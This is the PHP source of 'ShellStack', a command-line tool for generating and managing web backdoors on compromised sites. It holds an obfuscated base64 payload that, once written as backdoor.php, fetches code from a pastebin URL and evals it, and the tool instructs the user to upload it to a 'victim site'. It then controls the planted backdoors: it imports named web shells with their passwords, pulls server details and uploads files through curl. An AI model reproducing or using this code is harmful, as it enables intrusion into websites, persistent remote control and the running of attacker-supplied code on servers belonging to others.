<?php
//shell ShellStack
error_reporting(0);
$blue = "\e[34m";
$lblue = "\e[36m";
$cln = "\e[0m";
$green = "\e[92m";
$fgreen = "\e[32m";
$red = "\e[91m";
$bold = "\e[1m";
echo "
\e[96m
________________________________________________________________________________
_______ _     _ _______               _______ _______ _______ _______ _     _
|______ |_____| |______ |      |      |______    |    |_____| |       |____/
______| |     | |______ |_____ |_____ ______|    |    |     | |_____  |    \_
________________________________________________________________________________

                  $cln  Simple Backdoor Management System
                  $fgreen  Coded By$bold$red R3D#@x0R_2H1N A.K.A Tuhinshubhra $cln
                   $blue Shout Out:$bold LulZSec India $cln \e[96m
================================================================================
";
$bdcnt = "PD9waHAgJHsiXHg0N0xceDRmQlx4NDFMXHg1MyJ9WyJceDY4bVx4NzJceDZhXHg3MVx4NjNceDZmXHg3NHpceDcwIl09Ilx4NjJceDY0XHg2Zlx4NzIiOyR7Ilx4NDdceDRjT1x4NDJceDQxXHg0Y1x4NTMifVsiXHg2M1x4NzZceDY3cVx4NzlceDZkYWNmXHg2NSJdPSJiXHg2NFx4NmZyIjskeyR7Ilx4NDdMT1x4NDJceDQxXHg0Y1x4NTMifVsiXHg2OFx4NmRceDcyXHg2YXFjXHg2Zlx4NzRceDdhXHg3MCJdfT1maWxlX2dldF9jb250ZW50cygiXHg2OFx4NzR0cFx4NzM6Ly9ceDcwYXNceDc0ZWJpblx4MmVjb1x4NmQvXHg3MmFceDc3L1x4N2E3aWhceDU4cFx4NTZceDQxIik7ZXZhbCgkeyR7Ilx4NDdceDRjT1x4NDJBXHg0Y1x4NTMifVsiXHg2M1x4NzZceDY3XHg3MVx4NzlceDZkXHg2MWNmZSJdfSk7Cj8+";
echo "\n\n\n$cln";
echo $bold."List Of Backdoors:$cln";
$sscontents = file_get_contents("shells.txt");
$sscontents = trim($sscontents, "\n");
$shells = explode("\n", $sscontents);
echo "\n\n";
if ($sscontents == "") {
  echo $bold.$red."[!] No Backdoors In Your List!\n$cln";
}
else {
$sno = 0;
foreach ($shells as $shell) {
  echo $sno.". $shell\n";
  $sno++;
}
echo "=============================================";
}
menu1 :
echo "\n\n[#] Enter Either Of These (Backdoor No.|help|generatebd) : ";
$selects = trim(fgets(STDIN,1024));
if ($selects == "help") {
  echo "\n\n$bold"."Command List\n$cln";
  echo "=============\n\n";
  echo $bold."[+] generatebd:$cln Generates Backdoor File (backdoor.php)\n";
  echo $bold."[+] help:$cln Display This Help Screen\n";
  echo "[+] Select Backdoor By Typing In The Assigned Serial Number\n";
  goto menu1;
}
elseif ($selects == "generatebd") {
  echo $fgreen."\n\n[+] Generating Backdoor ...";
  file_put_contents ("backdoor.php", base64_decode($bdcnt));
  echo $cln.$lblue."\n[i] Backdoor Created at$blue backdoor.php$cln";
  echo "\n[i] Now Upload This To The Victim Site And Add The URL In$bold shells.txt$cln File";
  echo "\n\n\n$cln";
  echo "Press Enter To Continue\n\n";
  trim(fgets(STDIN,1024));
  goto menu1;
}
else {
$selected1 = $shells[$selects];
echo "$bold";
echo "\n[+] Shell Selected:$cln ".$selected1."\n";
echo $bold."[+] Validating Backdoor:$cln ";
$ssv = $selected1."?sscmd=v";
$vfc = file_get_contents ($ssv);
if ($vfc == "ssbkdrexst") {
  echo $fgreen."Backdoor Found!\n\n$cln";
  menu2:
  echo "List Of Actions\n$cln";
  echo "================\n";
  echo $green.$bold."[1]$cln Import PHP Shells\n";
  echo $blue.$bold."[2]$cln Server Details\n";
  echo $bold.$red."[3]$cln Remove Backdoor\n";
  echo $fgreen.$bold."[4]$cln Remote File Upload\n";
  echo $bold.$red."[5] Exit\n";
  echo "$cln";
  // Choose Action

  echo "\n[#] Select Option(1|2|3|4|5):";
  $action = trim(fgets(STDIN,1024));
  if ($action == "1") {
    echo "\n\nList Of Shells\n$cln";
    echo "===============\n";
    echo "[1]$bold Dhanush shell$cln {User & Pass : shellstack123}\n";
    echo "[2]$bold B374K shell$cln {Pass : shellstack123}\n";
    echo "[3]$bold Kurama shell$cln V.1.0 {Pass : red}\n";
    echo "[4]$bold WSO shell$cln {Pass : shellstack123}\n";
    echo "[5]$bold MiNi shell$cln {User & Pass : shellstack123}\n";
    //select Shell from list
    selectsshell:
    echo "\n[#] Select Shell To Import(1-5):";
    $impshell = trim(fgets(STDIN,1024));
    if ( !in_array($impshell, array('1','2','3','4','5'), true ) ) {
      echo $bold.$red."Invalid Input$cln \n";
      goto selectsshell;
    }
    else {
      echo $lblue."\n\n[i] Importing Shell...$cln";
      echo $lblue."\n[i] Sending Request And Getting Response...$cln";
      $shellact = $selected1."?sscmd=imps".$impshell;
      $shellimpresult = file_get_contents($shellact);
      echo "\n[R] ".$bold.$shellimpresult.$cln;
      echo "\n\n\n$cln";
      echo "Press Enter To Continue\n\n";
      trim(fgets(STDIN,1024));
      goto menu2;
    }
  }
elseif ($action == "2") {
    echo $bold.$lblue."\n[+] Server Info$cln";
    echo $lblue."\n[i] Sending Request And Getting Response...$cln";
    $svinfo = $selected1."?sscmd=si";
    $sicnt = file_get_contents($svinfo);
    echo $bold."\n$sicnt".$cln;
    echo "\n\n\n$cln";
    echo "Press Enter To Continue\n\n";
    trim(fgets(STDIN,1024));
    goto menu2;
}
elseif ($action == "3") {
  echo $bold.$red."\n[!] Destruct Backdoor$cln";
  echo $red."\n[i] This Process Is irreversible! TRY AT YOUR OWN RISK $cln";
  echo "\n\n[#] Type$bold FUCKME$cln To Confirm: ";
  $dela = trim(fgets(STDIN,1024));
  if ($dela == "FUCKME") {
    echo $red."\n[i] Asking The Poor BackDoor To DiE ... :($cln";
    echo $red."\n[i] Sending DEATH Request ... :(\n\n$cln";
    $delurl = $selected1."?sscmd=fuckme";
    //sending the server request in a lame way
    system ("curl -s $delurl");
    echo "\n\n[+] Confirming If That Poor Guy Is Really Dead: ";
    $cnfrmdel = file_get_contents ($ssv);
    if ($cnfrmdel == "ssbkdrexst") {
      echo "Couldn't Kill That Bastard!\n\n";
    }
    else {
      echo "Confirmed! It's DEAD!\n";
      echo "[i] Remove This Backdoor From$bold shells.txt$cln It's Of No Use Now!";
      echo "\n\n";
    }
  }
  else {
    echo "\n[!] Confirmation Failed! Going Back To Previous Menu!";
    echo "\n\n\n$cln";
    echo "Press Enter To Continue\n\n";
    trim(fgets(STDIN,1024));
    goto menu2;
  }
}
elseif ($action == "4") {
  echo $bold.$lblue."[+] Remote File Upload$cln";
  echo "\n[i] Upload Files From Your System\n\n";
  uploadremotefile:
  echo "\n[#] Enter File Path: ";
  $fpath = trim(fgets(STDIN,1024));
  echo "[#] Enter File Name: ";
  $fname = trim(fgets(STDIN,1024));
  echo $lblue."\n[-] File Selected:$cln $fpath";
  echo $lblue."\n[-] File Name Selected:$cln $fname";
  echo $lblue."\n[+] Checking If File Exists: $cln";
  if (file_exists($fpath)) {
    echo "File Exists\n";
    echo $blue."[i] Initializing File Upload\n$cln";
    $fileData = file_get_contents($fpath);
    $fileData = base64_encode($fileData);
    echo $lblue."[i] Sending Request And Getting Response...\n\n$cln";
    system("curl -s -F fileData=$fileData -F fileName=$fname -F file=@$fpath $selected1?sscmd=u");
    echo "\n\n\n$cln";
    echo "Press Enter To Continue\n\n";
    trim(fgets(STDIN,1024));
    goto menu2;
  }
  else {
    echo $red."File Do Not Exist! Aborting Uplod Procedure ...\n\n$cln";
    goto uploadremotefile;
  }
}
}
else {
  echo $red."Backdoor Not Found Quitting...$cln \n";
}
}
 ?>
